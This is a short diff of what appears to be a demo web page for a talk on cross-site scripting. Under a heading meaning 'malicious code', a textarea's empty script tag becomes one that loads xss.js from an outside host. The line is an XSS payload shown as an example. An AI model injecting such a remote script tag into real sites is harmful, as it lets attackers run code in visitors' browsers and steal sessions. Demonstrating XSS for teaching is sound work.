@@ -73,5 +73,6 @@ echo $tweet;
 
 <h2 class="marginTop10">恶意代码</h2>
 <textarea class="xss-code">
-<script src=></script>
+<script src=http://github.zhangl.in/ppt/20121228/xss.js></script>
 </textarea>
+
